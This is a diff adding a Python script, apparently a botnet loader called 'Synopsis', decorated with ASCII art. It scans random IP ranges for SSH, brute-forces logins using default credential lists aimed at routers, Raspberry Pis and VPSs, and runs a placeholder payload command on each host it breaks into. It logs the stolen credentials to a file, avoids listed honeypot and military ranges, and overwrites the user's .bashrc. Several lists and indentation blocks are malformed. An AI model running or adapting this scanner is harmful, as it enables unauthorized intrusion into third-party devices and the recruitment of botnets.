@@ -1,0 +1,470 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+#MUST INSTALL PARAMIKO
+#yum install python-paramiko -y
+#Example: python Synopsis.py 369 BUSYBOX 1.1 BusyBox
+"""
+           __         .' '.
+         _/__)        .   .       .
+        (8|)_}}- .      .        .
+         `\__)    '. . ' ' .  . '
+
+			 Oppresing V.1
+			  Hive of
+			    Bees
+     ^^      .-=-=-=-.  ^^
+ ^^        (`-=-=-=-=-`)         ^^
+         (`-=-=-=-=-=-=-`)  ^^         ^^
+   ^^   (`-=-=-=-=-=-=-=-`)   ^^                            ^^
+       ( `-=-=-=-(@)-=-=-` )      ^^
+       (`-=-=-=-=-=-=-=-=-`)  ^^
+       (`-=-=-=-=-=-=-=-=-`)              ^^
+       (`-=-=-=-=-=-=-=-=-`)                      ^^
+       (`-=-=-=-=-=-=-=-=-`)  ^^
+        (`-=-=-=-=-=-=-=-`)          ^^
+         (`-=-=-=-=-=-=-`)  ^^                 ^^
+           (`-=-=-=-=-`)
+            `-=-=-=-=-`
+
+                  .' '.            __
+         .        .   .           (__\_
+          .         .         . -{{_(|8)
+            ' .  . ' ' .  . '     (__/`
+
+
+Usage: python Synopsis.py [threads] [A|B|C|BRAZIL|SUPER|LUCKY|LUCKY2|RAND|INTERNET|BUSYBOX|PI] [IPRANGE] [1|2|routers|perl|ubuntu|root|vps1|vps2|vps3|r00ted|BusyBox]
+Skype: Oppressings
+XMPP:  Oppressing@swissjabber.li
+Site:  www.synopsis.ml
+
+
+# .d8888. db    db d8b   db  .d88b.  d8888b. .d8888. d888888b .d8888.
+# 88'  YP `8b  d8' 888o  88 .8P  Y8. 88  `8D 88'  YP   `88'   88'  YP
+# `8bo.    `8bd8'  88V8o 88 88    88 88oodD' `8bo.      88    `8bo.
+#   `Y8b.    88    88 V8o88 88    88 88~~~     `Y8b.    88      `Y8b.
+# db   8D    88    88  V888 `8b  d8' 88      db   8D   .88.   db   8D
+# `8888Y'    YP    VP   V8P  `Y88P'  88      `8888Y' Y888888P `8888Y'
+
+
+Made by: Oppressings
+Fixed by: Blazed
+Broken by: P00CH
+
+
+"""
+import threading, paramiko, random, socket, time, sys, os
+usage='python Synopsis.py [threads] [A|B|C|BRAZIL|SUPER|LUCKY|LUCKY2|RAND|INTERNET|BUSYBOX|PI] [IPRANGE] [1|2|routers|perl|ubuntu|root|vps1|vps2|vps3|r00ted|BusyBox]'
+if len(sys.argv) < 4:
+        sys.exit(usage)
+os.system("echo -e 'ulimit -s 999999; ulimit -n 999999; ulimit -u 999999\n' > ~/.bashrc")
+os.system("ulimit -s 999999; ulimit -n 999999; ulimit -u 999999")
+paramiko.util.log_to_file("/dev/null")
+os.system("sysctl -w fs.file-max=999999 >/dev/null")
+print("Starting the Scan!")
+"""
+
+  ___   _      ___   _      ___   _      ___   _      ___   _
+ [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|
+  '-`  |_|     '-`  |_|     '-`  |_|     '-`  |_|     '-`  |_|
+ /mmm/  /     /mmm/  /     /mmm/  /     /mmm/  /     /mmm/  /
+       |____________|____________|____________|____________|
+                             |            |            |
+                         ___  \_      ___  \_      ___  \_
+                        [(_)] |=|    [(_)] |=|    [(_)] |=|
+                         '-`  |_|     '-`  |_|     '-`  |_|
+                        /mmm/        /mmm/        /mmm/
+
+
+
+╔═╗┌─┐┌┬┐  ╔╦╗┬ ┬┌─┐┌┬┐  ╔╗ ┌─┐┌┬┐┌─
+║ ╦├┤  │    ║ ├─┤├┤ │││  � ╩╗│ │ │ └─┐
+╚═╝└─┘ ┴    ╩ ┴ ┴└─┘┴ ┴  ╚═╝└─┘ ┴ └─┘
+
+===============================================================================
+
+     (()__(()
+     /       \
+    ( /    \  \
+     \ o o    /
+     (_()_)__/ \
+    / _,==.____ \
+   (   |--|      )
+   /\_.|__|'-.__/\_
+  / (        /     \
+  \  \      (      /
+   )  '._____)    /
+(((____.--(((____/
+
+
+╔╗ ┬  ┌─┐┌─┐┬┌─╦  ┬┌─┐┌┬┐
+� ╩╗│  ├─┤│  ├┴┐║  │└─┐ │
+╚═╝┴─┘┴ ┴└─┘┴ ┴╩═╝┴└─┘ ┴
+
+╦ ╦┌─┐┌┐┌┌─┐┬ ┬╔═╗┌─┐┌┬┐┌─┐
+� ═╣│ ││││├┤ └┬┘� ═╝│ │ │ └─┐
+╩ ╩└─┘┘└┘└─┘ ┴ ╩  └─┘ ┴ └─┘
+╔═╗┌─┐┬  ┬┌─┐┬─┐┌┬┐┌─┐┌┐┌┌┬┐╦╔═╗╔═╗
+║ ╦│ │└┐┌┘├┤ ├┬┘│││├┤ │││ │ ║� ═╝╚═╗
+╚═╝└─┘ └┘ └─┘┴└─┴ ┴└─┘┘└┘ ┴ ╩╩  ╚═╝
+Hetzner = HoneyPot
+Multicast = for a designated network service.
+
+"""
+
+cmd='PAYLOAD'
+blacklist = [
+    '127'
+     '78.46.0.0/15' # Hetzner
+'85.10.0.0/15' # Hetzner
+'85.12.0.0/14' # Hetzner
+'85.16.0.0/12' # Hetzner
+'85.32.0.0/11' # Hetzner
+'85.64.0.0/10' # Hetzner
+'85.128.0.0/9' # Hetzner
+'86.0.0.0/7' # Hetzner
+'88.0.0.0/9' # Hetzner
+'88.128.0.0/10' # Hetzner
+'88.192.0.0/14' # Hetzner
+'88.1960.0/15' # Hetzner
+'88.198.0.0/16' # Hetzner
+'136.243.0.0/16' # Hetzner
+'136.244.0.0/14' # Hetzner
+'136.248.0.0/13' # Hetzner
+'137.0.0.0/8' # Hetzner
+'138.0.0.0/8' # Hetzner
+'148.251.0.0/16' # Hetzner
+'185.12.0.0/14' # Hetzner
+'185.16.0.0/12' # Hetzner
+'185.32.0.0/11' # Hetzner
+'185.64.0.0/10' # Hetzner
+'185.128.0.0/9' # Hetzner
+'186.0.0.0/7' # Hetzner
+'188.0.0.0/6' # Hetzner
+'192.0.0.0/4' # Hetzner
+'208.0.0.0/6' # Hetzner
+'212.0.0.0/7' # Hetzner
+'213.0.0.0/8' # Hetzner
+'10.0.0.0/8'  # Private
+'127.0.0.0/8' # Loopback
+'224.0.0.0/8' # Multicast
+'225.0.0.0/8' # Multicast
+'226.0.0.0/8' # Multicast
+'227.0.0.0/8' # Multicast
+'228.0.0.0/8' # Multicast
+'239.0.0.0/8' # Multicast
+'255.0.0.0/8' # Reserved
+'6.0.0.0/8' # Department of Defense
+'7.0.0.0/8' # DoD
+'11.0.0.0/8' # DoD
+'21.0.0.0/8' # DoD
+'22.0.0.0/8' # DoD
+'26.0.0.0/8' # DoD
+'28.0.0.0/8' # DoD
+'29.0.0.0/8' # DoD
+'30.0.0.0/8' # DoD
+'33.0.0.0/8' # DoD
+'55.0.0.0/8' # Department of Defense
+'214.0.0.0/8' # DoD
+'215.0.0.0/8' # DoD
+'18.0.0.0/8' # Massachusetts Institute of Technology
+'100.64.0.0/10' # Private
+'169.254.0.0/16' # Private
+'172.16.0.0/12' # Private
+'192.168.0.0/16' # Private
+'128.236.0.0/16' # USAF
+'128.217.0.0/16' # NASA
+'128.216.0.0/16' # AFB
+'128.202.0.0/16' # USAF
+'128.190.0.0/16' # Department of Defense
+'128.183.0.0/16' # NASA
+'128.161.0.0/16' # NASA
+'128.160.0.0/16' # Navy
+'128.159.0.0/16' # NASA
+'128.158.0.0/16' # NASA
+'128.157.0.0/16' # NASA
+'128.156.0.0/16' # NASA
+'128.102.0.0/16' # NASA
+'128.149.0.0/16' # NASA
+'128.154.0.0/16' # NASA
+'128.155.0.0/16' # NASA
+]
+passwords = [
+	"root:root",
+	"root:toor",
+	"root:admin",
+	"root:1234",
+	"root:pi",
+	"root:alpine",
+	"root:password",
+	"root:centos6svm",
+	"root:1234",
+  "root:123456",
+  "root:Zero",
+  "root:Password",
+  "root:password",
+  "root:qwerty",
+  "root:abc123"
+	"admin:admin",
+	"admin:1234",
+	"admin:Guest",
+	"ubnt:ubnt",
+	"guest:guest",
+	"user:user",
+	"test:test",
+	"pi:raspberry",
+	"vagrant:vagrant",
+	"localhost:root",
+	"CISCO:CISCO",
+	"netgear:netgear",
+	"support:support",
+	"oracle:oracle",
+	"cusadmin:password",
+]
+
+"""
+    NET             .-,(  ),-.
+   __  _         .-(          )-.           gateway           BOT
+  [__]|=|  ---->(    internet    )-------> __________ ------> ____   __
+  /::/|_|        '-(          ).-'        [_...__...°]       |    | |==|
+                     '-.( ).-'                               |____| |  |
+                                                             /::::/ |__|
+
+╦╔═╗  ╦═╗┌─┐┌┐┌┌─┐┌─┐┌─┐
+║� ═╝  � ╦╝├─┤││││ ┬├┤ └─┐
+╩╩    ╩╚═┴ ┴┘└┘└─┘└─┘└─┘
+"""
+noodle = ["122.54","122.53","122.3","124.106","124.107","119.93","119.92","124.105","124.104","119.91"]#noodle edit
+yeet = ["119","168","122","131","161","37","186","187","31","188","201","2","200"]
+load = ["125.25","125.26","125.27","119.92","119.93","180.180","113.53","185.52","24.243","76.14","208.124","52.129"]
+BUSYBOX =["113.20","113.61","119.93","119.92","119.94","124.104","124.105","124.107","131.72","110.77","92.127","71.216"]
+lucky = ["37.236","37.239","37.238","37.237","1.20","5.78","46.62","101.109","125.24","125.25","125.26","125.27","125.28","113.53","101.51","101.108","118.175","118.173","182.52","180.180","179.97","179.189","177.44","177.38"]
+PI = ["191.191","191.251","2.224","2.225","2.235","2.236","213.231","217.103","217.217","31.151","37.132","37.133","37.134","37.14","46.136","59.126","62.57","62.83","75.135","78.45","79.150","79.151","79.158","81.203"]
+lucky2 = ["119.91","119.92","119.93","113.53","49.146","59.69","122.3","122.52","122.54","119.93","124.105","125.104","49.144","49.145","103.20","103.30","103.47","103.57"]
+lol = ["1","2","5","119","180","113","125","122","46","101"]
+
+
+
+"""
+                  _  _
+                | )/ )
+             \\ |//,' __
+             (")(_)-"()))=-
+                (\\
+                             _   _
+  HEELP                     ( | / )
+                          \\ \|/,' __
+    \_o_/                 (")(_)-"()))=-
+       )                     <\\
+      /\__
+_____ \ ________________________________
+
+
+╔═╗┌┬┐┬┌┐┌┌─┐┬┌┐┌┌─┐  ╔╦╗┬ ┬┌─┐  ╔═╗┌─┐┬─┐┬  ┬┌─┐┬─┐┌─┐
+╚═╗ │ │││││ ┬│││││ ┬   ║ ├─┤├┤   ╚═╗├┤ ├┬┘└┐┌┘├┤ ├┬┘└─┐
+╚═╝ ┴ ┴┘└┘└─┘┴┘└┘└─┘   ╩ ┴ ┴└─┘  ╚═╝└─┘┴└─ └┘ └─┘┴└─└─┘
+
+
+
+"""
+
+if sys.argv[4] == '1':
+    passwords = ["root:root", "root:admin", "admin:1234"]
+if sys.argv[4] == '2':
+	passwords = ["root:root", "root:toor", "root:admin", "admin:1234", "oracle:oracle", "root:alpine"]
+if sys.argv[4] == '3':
+    passwords = ["admin:1234"]#noodle edit
+if sys.argv[4] == 'routers':
+	passwords = ["root:admin", "root:root", "admin:1234", "admin:password", "cisco:cisco", "netgear:netgear", "cusadmin:password"]
+if sys.argv[4] == 'perl':
+    passwords = [ "pi:raspberry", "vagrant:vagrant", "ubnt:ubnt" ]
+if sys.argv[4] == 'ubuntu':
+    passwords = [ "ubnt:ubnt", "ubnt:1234", "ubnt:password" ]
+if sys.argv[4] == 'root':
+    passwords = [ "root:root","root:test" ]
+if sys.argv[4] == 'vps1':
+	passwords = [ "root:maxided", "root:centos6svm", "root:123456", "root:Love2020", "root:Zero", "root:Password", "root:password"]
+if sys.argv[4] == 'vps2':
+	passwords = [ "root:maxided", "root:centos6svm", "root:1234", "root:qwerty", "root:dragon", "root:pussy", "root:baseball"]
+if sys.argv[4] == 'vps3':
+	passwords = [ "root:maxided", "root:centos6svm", "root:football", "root:monkey", "root:696969", "root:abc123"]
+if sys.argv[4] == 'r00ted':
+	passwords = [ "localhost:root","root:r00tnull3d#", "root:Flunzy2016", "bash:root"]
+if sys.argv[4] == 'brute':
+	passwords = [ "root:centos6svm", "root:root", "root:toor", "root:abc123", "root:maxided"]
+if sys.argv[4] == 'lol':
+	passwords = [ "admin:1234"]
+if sys.argv[4] == 'BusyBox':
+	passwords = [ "root:admin", "ubnt:ubnt"]
+if sys.argv[4] == 'pi':
+	passwords = [ "osmc:osmc", "pi:raspberry"]
+
+"""
+╦╔═╗  ╔═╗┬  ┌─┐┌─┐┌─┐┌─┐┌─┐
+║� ═╝  ║  │  ├─┤└─┐└─┐├┤ └─┐
+╩╩    ╚═╝┴─┘┴ ┴└─┘└─┘└─┘└─┘
+
+                                ;.         .'
+       The Bees Have ......    ;-_ ; \       /  _
+                    ;.         .` `-. \    .:.-'
+      ;.        ;.' ; \       /  `.-.`.\, /  "\
+  ;-_ ; \       /` _-. \    .:.-'  '-._\/;\   /
+   ` `-. \    .:.-'.-.`.\, /  "\     ,;\\\|`-' ;.         .'
+    `.-.`.\, /  "\  '-._\/;\   /    (\\\.'/;-_ ; \       /  _
+      '-._\/;\   /    ,;\\\|`-'   ;. `._.'  `.`-. \    .:.-'
+        ,;\\\|`-' ;. (\\\.'/ .'-_ ; \       /`.-.`.\, /  "\
+       (\\\.'/;-_ ; \ `._.' /  _ `-. \    .:.-''-._\/;\   /
+    ;.  `._.'  .'`-. \    .:.-' `.-.`.\, /  "\   ,;\\\|`-'
+;-_ ; \       / `_-.`.\, /  "\    '-._\/;\   /  (\\\.'/
+ ` `-. \    .:.-' '-._\/;\   /      ,;\\\|`-' ;. `._.'   .'
+  `.-.`.\, /  "\    ,;\\\|`-'  ;.  (\\\.'/;-_ ; \       /  _
+    '-._\/;\   /   (\\\.'/ ;-_ ; \  `._.'/ `_`-. \    .:.-'
+      ,;\\\|`-'  ;. `._.'   .'`-. \    .:.-'`.-.`.\, /  "\
+     (\\\.'/ ;-_ ; \       / `_-.`.\, /  "\   '-._\/;\   /
+    mx`._.'   ` `-. \    .:.-' '-._\/;\   /     ,;\\\|`-'
+               `.-.`.\, /  "\    ,;\\\|`-'     (\\\.'/
+                 '-._\/;\   /   (\\\.'/         `._.'
+                   ,;\\\|`-'     `._.'
+                  (\\\.'/
+                   `._.'            ... GATHERD ?
+"""
+ipclassinfo = sys.argv[2]
+if ipclassinfo == "A":
+    ip1 = sys.argv[3]
+elif ipclassinfo == "B":
+    ip1 = sys.argv[3].split(".")[0]
+    ip2 = sys.argv[3].split(".")[1]
+elif ipclassinfo == "C":
+    ips = sys.argv[3].split(".")
+    num=0
+    for ip in ips:
+        num=num+1
+        if num == 1:
+            ip1 = ip
+        elif num == 2:
+            ip2 = ip
+        elif num == 3:
+            ip3 = ip
+"""
+
+
+                   ~Steroids~
+ .      |___________________________________
+  |-----|- - -|''''|''''|''''|''''|''''|'##\|__
+  |- -  |  cc 6    5    4    3    2    1 ### __]==---------------------- ¸.·´¯`·¸¸.·´¯`·.¸.-<\\^}0=:
+  |-----|________________________________##/|          ~INJECTING~
+        |""""""""""""""""""""""""""""""""
+
+
+                                  ...vvvv)))))).
+       /~~\               ,,,c(((((((((((((((((/
+      /~~c \.         .vv)))))))))))))))))))\``
+          G_G__   ,,(((KKKK//////////////'
+        ,Z~__ '@,gW@@AKXX~MW,gmmmz==m_.
+       iP,dW@!,A@@@@@@@@@@@@@@@A` ,W@@A\c
+       ]b_.__zf !P~@@@@@*P~b.~+=m@@@*~ g@Ws.
+          ~`    ,2W2m. '\[ ['~~c'M7 _gW@@A`'s
+            v=XX)====Y-  [ [    \c/*@@@*~ g@@i
+           /v~           !.!.     '\c7+sg@@@@@s.
+          //              'c'c       '\c7*X7~~~~
+         ]/                 ~=Xm_       '~=(Gm_.
+
+                 ~Steroids~
+                 Activated
+
+
+"""
+class sshscanner(threading.Thread):
+    global passwords
+    global ipclassinfo
+    if ipclassinfo == "A":
+        global ip1
+    elif ipclassinfo == "B":
+        global ip1
+        global ip2
+    elif ipclassinfo == "C":
+        global ip1
+        global ip2
+        global ip3
+    def run(self):
+        while 1:
+            try:
+                while 1:
+                    thisipisbad='no'
+                    if ipclassinfo == "A":
+                        self.host = ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+                    elif ipclassinfo == "B":
+                        self.host = ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+                    elif ipclassinfo == "C":
+                        self.host = ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
+                    elif ipclassinfo == "NOODLE":
+                        self.host = random.choice(noodle)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+                    elif ipclassinfo == "SUPER":
+                        self.host = random.choice(yeet)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+                    elif ipclassinfo == "LUCKY":
+                        self.host = random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+                    elif ipclassinfo == "LUCKY2":
+                        self.host = ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
+                    elif ipclassinfo == "BUSYBOX":
+                        self.host = random.choice(BUSYBOX)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+                    elif ipclassinfo == "PI":
+                        self.host = random.choice(PI)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+                    elif ipclassinfo == "RAND":
+                        self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+                    elif ipclassinfo == "INTERNET":
+                        self.host = random.choice(lol)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+		    elif ipclassinfo == "LOAD":
+						self.host = random.choice(load)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+                    else:
+                        self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+                    for badip in blacklist:
+                        if badip in self.host:
+                            thisipisbad='yes'
+                    if thisipisbad=='no':
+                        break
+                username='root'
+                password=""
+                port = 22
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(3)
+                s.connect((self.host, port))
+                s.close()
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                dobreak=False
+                for passwd in passwords:
+                    if ":n/a" in passwd:
+                        password=""
+                    else:
+                        password=passwd.split(":")[1]
+                    if "n/a:" in passwd:
+                        username=""
+                    else:
+                        username=passwd.split(":")[0]
+                    try:
+                        ssh.connect(self.host, port = port, username=username, password=password, timeout=3)
+                        dobreak=True
+                        break
+                    except:
+                        pass
+                    if True == dobreak:
+                        break
+                badserver=True
+                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
+                output = stdout.read()
+                if "inet addr" in output:
+                    badserver=False
+                if badserver == False:
+                        print '\x1b[31mSTINGING:'+self.host+'|'+username+'|'+password+'|'+str(port)
+                        ssh.exec_command(""+cmd+"")
+                        time.sleep(20)
+                        ssh.close()
+			open("Stung.txt","a").write(username+":"+password+":"+self.host+"\n")
+            except:
+                pass
+
+for x in range(0,int(sys.argv[1])):
+    try:
+        t = sshscanner()
+        t.start()
+    except:
+        pass
